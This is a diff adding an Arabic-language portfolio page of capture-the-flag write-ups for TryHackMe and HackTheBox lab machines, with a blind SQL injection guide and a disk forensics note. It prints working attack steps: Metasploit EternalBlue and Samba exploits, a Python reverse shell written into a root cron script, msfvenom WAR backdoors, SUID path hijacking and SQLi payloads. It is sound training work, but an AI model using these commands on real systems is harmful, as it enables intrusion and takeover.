+                    <i class="fa-solid fa-globe"></i>
+                    <span>أمن تطبيقات الويب والبحث الأمني (Web Security)</span>
+                </h2>
+                <span class="platform-count-badge">دليل احترافي</span>
+            </div>
+
+            <div class="skills-grid ctf-cards-container">
+                <!-- Web Sec 1: Blind SQLi -->
+                <article class="writeup-media-card" data-category="web" data-keywords="sqli blind sql injection pdo sqlmap owasp-a03 web defense security">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-shield-virus"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag web wmc-badge-top"><i class="fa-solid fa-globe"></i> Web Security</span>
+                        <span class="difficulty-badge medium wmc-diff-top">Medium</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="#" onclick="openWriteup('sqli-guide'); return false;">دليل تحليل ثغرات Blind SQL Injection والحماية</a></h3>
+                        <p class="wmc-desc">تحليل عميق لهجمات SQLi العمياء (Boolean &amp; Time-Based)، كيفية بناء الحمولات، استخدام sqlmap، مع نماذج الكود المنيع (Parameterized Queries).</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-clock"></i> 15 دقيقة</span>
+                            <button class="btn-read-modal" onclick="openWriteup('sqli-guide')">
+                                <span>عرض التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+            </div>
+        </section>
+
+        <!-- رسالة عند عدم العثور على نتائج بحث -->
+        <div id="noSearchResults" style="display:none; text-align:center; padding: 40px 20px;">
+            <i class="fa-solid fa-triangle-exclamation" style="font-size:2.5rem; color:var(--accent-color); margin-bottom:14px;"></i>
+            <h3 style="color:var(--text-main); font-size:1.3rem;">لم يتم العثور على أي تقارير تطابق بحثك</h3>
+            <p style="color:var(--text-muted); font-size:0.95rem;">جرب استخدام كلمات بحث بديلة مثل: HTB, Linux, Windows, Samba, RCE</p>
+        </div>
+
+        <!-- баннер الدعوة للتواصل -->
+        <div class="writeups-cta-banner" data-aos="fade-up">
+            <div class="cta-banner-content">
+                <div class="cta-icon-box">
+                    <i class="fa-solid fa-folder-plus"></i>
+                </div>
+                <div class="cta-text">
+                    <h4>يتم تحديث التقارير بانتظام فور حل كل آلة جديدة</h4>
+                    <p>أقوم بتسجيل وحفظ كافة الأوامر والملاحظات في بيئات المعامل والـ CTF. هل تود مناقشة تقرير معين أو تجربة بيئة مشتركة؟</p>
+                </div>
+            </div>
+            <div class="cta-actions">
+                <a href="index.html#contact" class="btn btn-primary">
+                    <i class="fa-solid fa-paper-plane"></i>
+                    <span>تواصل معي مباشرة</span>
+                </a>
+            </div>
+        </div>
+    </main>
+
+    <!-- تذييل الصفحة -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">Ft7y<span>.Sec</span></div>
+            <div class="footer-links">
+                <a href="index.html#home">الرئيسية</a>
+                <a href="pentest.html">اختبار الاختراق</a>
+                <a href="appsec.html">أمن التطبيقات</a>
+                <a href="automation.html">البرمجة والأتمتة</a>
+                <a href="systems-labs.html">الأنظمة والمعامل</a>
+                <a href="writeups.html">CTF Write-ups</a>
+                <a href="index.html#contact">تواصل معي</a>
+            </div>
+            <p>© 2026 Ft7y.Sec — باحث أمني ومطور ويب. جميع الحقوق محفوظة.</p>
+        </div>
+    </footer>
+
+    <!-- ====================================================
+         WRITEUP DETAIL MODALS (التقارير التفاعلية الكاملة)
+         ==================================================== -->
+
+    <!-- Modal 1: Blue (TryHackMe) -->
+    <div class="wup-modal-overlay" id="modal-blue-thm" onclick="closeWriteupIfOutside(event, 'blue-thm')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-blue-thm">
+            <button class="wup-modal-close" onclick="closeWriteup('blue-thm')" aria-label="إغلاق النافذة">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag thm"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Windows</span>
+                    <span class="tag">#MS17-010</span>
+                    <span class="tag">#EternalBlue</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-blue-thm">🔵 Blue — استغلال ثغرة EternalBlue (MS17-010) والتحكم الكامل</h2>
+                <div class="wup-modal-meta">
+                    <span><i class="fa-regular fa-calendar"></i> يناير 2025</span>
+                    <span><i class="fa-regular fa-clock"></i> وقت القراءة: 8 دقائق</span>
+                    <span><i class="fa-solid fa-user-shield"></i> إعداد: محمد فتحي (Ft7y.Sec)</span>
+                </div>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-circle-info"></i> ملخص التحدي والبيئة المستهدفة</h3>
+                    <p>
+                        غرفة <strong>Blue</strong> على منصة TryHackMe تحاكي خادم Windows 7 SP1 مصاب بثغرة <strong>MS17-010 (EternalBlue)</strong> الشهيرة في تنفيذ الأوامر عن بُعد عبر بروتوكول SMBv1. الهدف هو استغلال الثغرة، ترقية الصلاحيات إلى <code>NT AUTHORITY\SYSTEM</code>، واستخراج ثلاثة أعلام موزعة في مسارات النظام.
+                    </p>
+                </div>
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-magnifying-glass"></i> المرحلة الأولى: الفحص والاستكشاف (Reconnaissance)</h3>
+                    <p>بدأنا بفحص المنافذ باستخدام Nmap لتحديد الخدمات واكتشاف قابلية النظام للإصابة بثغرة EternalBlue:</p>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Nmap Vulnerability Scan</span></div>
+                        <pre><code>$ nmap -sV -sC -p 139,445 --script vuln 10.10.x.x
+
+PORT    STATE SERVICE      VERSION
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143</code></pre>
+                    </div>
+                </div>
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-bolt"></i> المرحلة الثانية: استغلال الثغرة (Exploitation)</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>MSFCONSOLE — Metasploit Framework</span></div>
+                        <pre><code>msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.x.x
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 10.x.x.x:4444
+[*] 10.10.x.x:445 - Connecting to target for exploitation...
+[+] 10.10.x.x:445 - Target is OS: Windows 7 Professional 7601 SP1
+[+] 10.10.x.x:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] Meterpreter session 1 opened!
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM</code></pre>
+                    </div>
+                </div>
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-flag"></i> الأعلام الثلاثة (Flags Extraction)</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>CMD — Flag Locations</span></div>
+                        <pre><code># Flag 1 (Root of C:)
+C:\> type C:\flag1.txt
+flag{access_the_machine}
+
+# Flag 2 (SAM Database / Passwords location)
+C:\Windows\System32\config> type flag2.txt
+flag{sam_database_harvested}
+
+# Flag 3 (Administrator Documents)
+C:\Users\Administrator\Documents> type flag3.txt
+flag{all_flags_captured_system}</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 2: Kenobi (TryHackMe) -->
+    <div class="wup-modal-overlay" id="modal-kenobi-thm" onclick="closeWriteupIfOutside(event, 'kenobi-thm')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-kenobi-thm">
+            <button class="wup-modal-close" onclick="closeWriteup('kenobi-thm')" aria-label="إغلاق النافذة">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag thm"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Linux</span>
+                    <span class="tag">#Samba</span>
+                    <span class="tag">#SUID</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-kenobi-thm">🐧 Kenobi — Samba, ProFTPD 1.3.5 &amp; SUID Path Hijacking</h2>
+                <div class="wup-modal-meta">
+                    <span><i class="fa-regular fa-calendar"></i> فبراير 2025</span>
+                    <span><i class="fa-regular fa-clock"></i> وقت القراءة: 10 دقائق</span>
+                    <span><i class="fa-solid fa-user-shield"></i> إعداد: محمد فتحي (Ft7y.Sec)</span>
+                </div>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-circle-info"></i> ملخص الآلة</h3>
+                    <p>
+                        آلة Linux تركز على التعداد العميق لمشاركات SMB و NFS، واستغلال أمر <code>SITE CPFR/CPTO</code> غير الموثق في خادم ProFTPD 1.3.5 لنسخ مفتاح SSH، ثم تصعيد الصلاحيات إلى Root عبر التلاعب بمتغير PATH في ملف تنفيذي SUID مخصص.
+                    </p>
+                </div>
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-bolt"></i> استغلال ثغرة ProFTPD (CVE-2015-3306)</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — ProFTPD Copy Commands</span></div>
+                        <pre><code>$ nc 10.10.x.x 21
+220 ProFTPD 1.3.5 Server ready.
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+
+# ربط مشاركة /var عبر NFS واستخراج المفتاح
+$ sudo mount 10.10.x.x:/var /mnt/kenobiNFS
+$ cp /mnt/kenobiNFS/tmp/id_rsa . && chmod 600 id_rsa
+$ ssh -i id_rsa kenobi@10.10.x.x</code></pre>
+                    </div>
+                </div>
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-arrow-up-right-dots"></i> ترقية الصلاحيات إلى Root عبر SUID Path Hijacking</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — PrivEsc Path Injection</span></div>
+                        <pre><code># فحص الملف بواسطة strings
+kenobi@kenobi:~$ strings /usr/bin/menu
+curl -I localhost
+# يستدعي curl بدون مسار مطلق!
+
+kenobi@kenobi:~$ cd /tmp
+kenobi@kenobi:/tmp$ echo "/bin/sh" > curl
+kenobi@kenobi:/tmp$ chmod +x curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+# النتيجة:
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 3: Lame (HackTheBox) -->
+    <div class="wup-modal-overlay" id="modal-lame-htb" onclick="closeWriteupIfOutside(event, 'lame-htb')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-lame-htb">
+            <button class="wup-modal-close" onclick="closeWriteup('lame-htb')" aria-label="إغلاق النافذة">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag htb"><i class="fa-solid fa-cube"></i> HackTheBox</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Linux</span>
+                    <span class="tag">#CVE-2007-2447</span>
+                    <span class="tag">#RootShell</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-lame-htb">🦁 Lame — Samba 3.0.20 usermap_script RCE</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-circle-info"></i> ملخص الآلة</h3>
+                    <p>
+                        تعتبر <strong>Lame</strong> أولى آلات منصة HackTheBox التاريخية، وتمثل نموذجاً واقعياً للخوادم التي تعمل بإصدارات Samba قديمة جداً مصابة بثغرة تنفيذ الأوامر عبر خيار <code>username map script</code>.
+                    </p>
+                </div>
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-bolt"></i> الاستغلال المباشر كـ Root</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>MSFCONSOLE — Exploit</span></div>
+                        <pre><code>msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Command shell session 1 opened!
+id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 4: Bashed (HackTheBox) -->
+    <div class="wup-modal-overlay" id="modal-bashed-htb" onclick="closeWriteupIfOutside(event, 'bashed-htb')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-bashed-htb">
+            <button class="wup-modal-close" onclick="closeWriteup('bashed-htb')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag htb"><i class="fa-solid fa-cube"></i> HackTheBox</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#WebShell</span>
+                    <span class="tag">#CronPrivEsc</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-bashed-htb">💥 Bashed — phpbash Web Shell &amp; Cron Job Exploitation</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>🔍 الاستكشاف والوصول الأولي</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Gobuster Discovery</span></div>
+                        <pre><code>$ gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/dev                  (Status: 301)
+/php                  (Status: 301)
+
+# عند تصفح /dev وجدنا phpbash.min.php يعطي Terminal داخل المتصفح!</code></pre>
+                    </div>
+                </div>
+                <div class="wup-section">
+                    <h3>🔺 ترقية الصلاحيات عبر ملف test.py و Cron</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Sudo &amp; Cron PrivEsc</span></div>
+                        <pre><code>$ sudo -u scriptmanager bash
+# في المجلد /scripts وجدنا test.py ينفذه خادم cron بصلاحيات root كل دقيقة:
+$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.x.x',5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /scripts/test.py
+# استقبلنا اتصال Root Shell على المنفذ 5555!</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 5: Jerry (HackTheBox) -->
+    <div class="wup-modal-overlay" id="modal-jerry-htb" onclick="closeWriteupIfOutside(event, 'jerry-htb')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-jerry-htb">
+            <button class="wup-modal-close" onclick="closeWriteup('jerry-htb')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag htb"><i class="fa-solid fa-cube"></i> HackTheBox</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Tomcat</span>
+                    <span class="tag">#WAR</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-jerry-htb">🐱 Jerry — Apache Tomcat WAR Backdoor Deployment</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>⚡ إنشاء ورفع الباكدور عبر Msfvenom</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — msfvenom WAR creation</span></div>
+                        <pre><code>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o pwn.war
+
+# الدخول إلى http://10.10.10.95:8080/manager/html
+# بيانات تسجيل الدخول الافتراضية: tomcat : s3cret
+# رفع ملف pwn.war وتفعيله
+
+$ nc -lvnp 4444
+whoami
+nt authority\system</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 6: Pickle Rick (TryHackMe) -->
+    <div class="wup-modal-overlay" id="modal-picklerick-thm" onclick="closeWriteupIfOutside(event, 'picklerick-thm')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-picklerick-thm">
+            <button class="wup-modal-close" onclick="closeWriteup('picklerick-thm')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag thm"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Web</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-picklerick-thm">🥒 Pickle Rick — Command Injection &amp; Filter Evasion</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>⚡ تخطي فلترة الأوامر وقراءة المكونات</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Filter Bypass</span></div>
+                        <pre><code># أمر cat محظور من لوحة التحكم، استعضنا عنه بـ less و head:
+less "Sup3rS3cretPickl3Ingred.txt"     # المكون الأول: mr. meeseek hair
+less /home/rick/"second ingredients"   # المكون الثاني: 1 jerry tear
+sudo less /root/3rd.txt                # المكون الثالث: fleeb juice</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 7: Blind SQLi (Web Security) -->
+    <div class="wup-modal-overlay" id="modal-sqli-guide" onclick="closeWriteupIfOutside(event, 'sqli-guide')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-sqli-guide">
+            <button class="wup-modal-close" onclick="closeWriteup('sqli-guide')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag web"><i class="fa-solid fa-globe"></i> Web Security</span>
+                    <span class="difficulty-badge medium">Medium</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-sqli-guide">🗄️ دليل تحليل ثغرات Blind SQL Injection وطرق الوقاية</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>💡 آليات الحقن الأعمى (Boolean vs Time-Based)</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>SQL — Attack Payloads</span></div>
+                        <pre><code>-- Boolean-Based Injection
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+
+-- Time-Based Injection (عند غياب أي فروق بصرية بالاستجابة)
+' AND IF(1=1, SLEEP(5), 0)--</code></pre>
+                    </div>
+                </div>
+                <div class="wup-section">
+                    <h3>🛡️ كود الحماية الآمن (Parameterized Queries)</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>PHP PDO — Safe Implementation</span></div>
+                        <pre><code>// الكود الآمن باستخدام الاستعلامات المجهزة
+$stmt = $pdo->prepare('SELECT id, name, email FROM users WHERE username = :user');
+$stmt->execute(['user' => $userInput]);
+$user = $stmt->fetch();</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 8: Forensics (HackerDNA) -->
+    <div class="wup-modal-overlay" id="modal-forensics-dfir" onclick="closeWriteupIfOutside(event, 'forensics-dfir')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-forensics-dfir">
+            <button class="wup-modal-close" onclick="closeWriteup('forensics-dfir')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag hackerdna"><i class="fa-solid fa-dna"></i> HackerDNA</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-forensics-dfir">🔍 الطب الشرعي الرقمي — استرداد وتحليل الأدلة من الـ Disk</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>🛠️ خطوات الفحص واستخراج الملفات</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Autopsy &amp; Binwalk</span></div>
+                        <pre><code># فحص التوقيع الرقمي واستخراج الأجزاء المخفية
+$ binwalk -e evidence.raw
+$ fls -r -p evidence.raw | grep -i deleted
+# استعادة الملف المحذوف عبر icat
+$ icat evidence.raw 142 > recovered_secret.docx</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+    <script src="script.js"></script>
+    <script>
+        // تصفية المنصات الفورية داخل صفحة writeups.html
+        document.addEventListener('DOMContentLoaded', function() {
+            const filterTabs = document.querySelectorAll('[data-platform-filter]');
+            const platformSections = document.querySelectorAll('.platform-section-block');
+            const searchInput = document.getElementById('writeupFilterInput');
+            const cards = document.querySelectorAll('.writeup-media-card');
+            const noResults = document.getElementById('noSearchResults');
+
+            let currentPlatform = 'all';
+
+            function applyFilters() {
+                const query = (searchInput ? searchInput.value : '').toLowerCase().trim();
+                let visibleCount = 0;
+
+                platformSections.forEach(section => {
+                    const sectionPlatform = section.getAttribute('data-platform-section');
+                    const platformMatch = (currentPlatform === 'all' || currentPlatform === sectionPlatform);
+
+                    let sectionVisibleCards = 0;
+                    const sectionCards = section.querySelectorAll('.writeup-media-card');
+
+                    sectionCards.forEach(card => {
+                        const keywords = (card.getAttribute('data-keywords') || '').toLowerCase();
+                        const title = (card.querySelector('.wmc-title')?.textContent || '').toLowerCase();
+                        const desc = (card.querySelector('.wmc-desc')?.textContent || '').toLowerCase();
+                        const searchMatch = !query || keywords.includes(query) || title.includes(query) || desc.includes(query);
+
+                        if (platformMatch && searchMatch) {
+                            card.style.display = 'flex';
+                            sectionVisibleCards++;
+                            visibleCount++;
+                        } else {
+                            card.style.display = 'none';
+                        }
+                    });
+
+                    if (platformMatch && sectionVisibleCards > 0) {
+                        section.style.display = 'block';
+                    } else {
+                        section.style.display = 'none';
+                    }
+                });
+
+                if (noResults) {
+                    noResults.style.display = (visibleCount === 0) ? 'block' : 'none';
+                }
+            }
+
+            filterTabs.forEach(tab => {
+                tab.addEventListener('click', function() {
+                    filterTabs.forEach(t => t.classList.remove('active'));
+                    this.classList.add('active');
+                    currentPlatform = this.getAttribute('data-platform-filter');
+                    applyFilters();
+                });
+            });
+
+            if (searchInput) {
+                searchInput.addEventListener('input', applyFilters);
+            }
+        });
+    </script>
+</body>
+</html>
